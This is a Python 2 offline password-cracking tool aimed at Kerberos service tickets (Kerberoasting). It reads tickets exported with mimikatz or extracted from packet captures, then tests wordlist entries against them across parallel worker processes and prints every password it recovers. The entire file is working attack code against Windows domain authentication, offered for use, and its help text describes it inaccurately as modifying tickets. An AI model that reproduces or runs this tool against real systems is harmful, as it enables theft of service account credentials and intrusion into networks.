#!/usr/local/bin/python2 -tt

import kerberos
from pyasn1.codec.ber import encoder, decoder
from multiprocessing import Process, JoinableQueue, Manager
import glob
import sys

wordlist = JoinableQueue()
enctickets = None
#ENDOFQUEUE = 'ENDOFQUEUEENDOFQUEUEENDOFQUEUE'
class Logger(object):
    def __init__(self, filename='run.log', stream=sys.stdout):
	    self.terminal = stream
	    self.log = open(filename, 'a')

    def write(self, message):
	    self.terminal.write(message)
	    self.log.write(message)

    def flush(self):
	    pass

sys.stdout = Logger("./result/info.log", sys.stdout)
sys.stderr = Logger("./result/error.log", sys.stderr)		# redirect std err, if necessary

def loadwordlist(wordlistfile, wordlistqueue, threadcount):
	with open(wordlistfile, 'rb') as f:
		res = []
		while True:
			try:
				line = f.readline()
				# print(line, end='')
			except:
				continue
			if line == '':
				break
			res.append(line)

		# for w in f.xreadlines():
		for w in res:
			wordlistqueue.put(w.decode('utf-8').strip(), True)
	for i in range(threadcount):
		wordlistqueue.put('ENDOFQUEUEENDOFQUEUEENDOFQUEUE')


def crack(wordlist, enctickets):
	toremove = []
	while enctickets:
		try:
			word = wordlist.get()
			if word == 'ENDOFQUEUEENDOFQUEUEENDOFQUEUE':
				break
			print "\ntrying %s" % word.encode('utf-8').decode('utf-8-sig').strip()
			for et in enctickets:
				kdata, nonce = kerberos.decrypt(kerberos.ntlmhash(word), 2, et[0])
				if kdata:
					print 'found password for ticket %i: %s  File: %s' % (et[1], word, et[2])
					toremove.append(et)
				# if len(et):
					# print str(et[0])
			for et in toremove:
				try:
					enctickets.remove(et)
				except:
					return
				if not enctickets:
					return
		except:
			continue

if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Read kerberos ticket then modify it')
	parser.add_argument('wordlistfile', action='store',
					metavar='dictionary.txt', type=file, # windows closes it in thread
					help='the word list to use with password cracking')
	parser.add_argument('files', nargs='+', metavar='file.kirbi',
					help='File name to crack. Use asterisk \'*\' for many files.\n Files are exported with mimikatz or from extracttgsrepfrompcap.py')
	parser.add_argument('-t', '--threads', dest='threads', action='store', required=False, 
					metavar='NUM', type=int, default=5,
					help='Number of threads for guessing')
	
	args = parser.parse_args()

	if args.threads < 1:
		raise ValueError("Number of threads is too small")


	p = Process(target=loadwordlist, args=(args.wordlistfile.name, wordlist, args.threads))
	p.start()

	
	# is this a dump from extactrtgsrepfrompcap.py or a dump from ram (mimikatz)

	manager = Manager()
	enctickets = manager.list()

	i = 0
	for path in args.files:
		for f in glob.glob(path):
			with open(f, 'rb') as fd:
				data = fd.read()
			#data = open('f.read()

			if data[0] == '\x76':
				# rem dump 
				enctickets.append((str(decoder.decode(data)[0][2][0][3][2]), i, f))
				i += 1
			elif data[:2] == '6d':
				for ticket in data.strip().split('\n'):
					enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2]), i, f))
					i += 1

	crackers = []
	for i in range(args.threads):
		p = Process(target=crack, args=(wordlist,enctickets))
		p.start()
		crackers.append(p)

	for p in crackers:
		p.join()

	wordlist.close()

	if len(enctickets):
		print "Unable to crack %i tickets" % len(enctickets)
	else:
		print "All tickets cracked!"
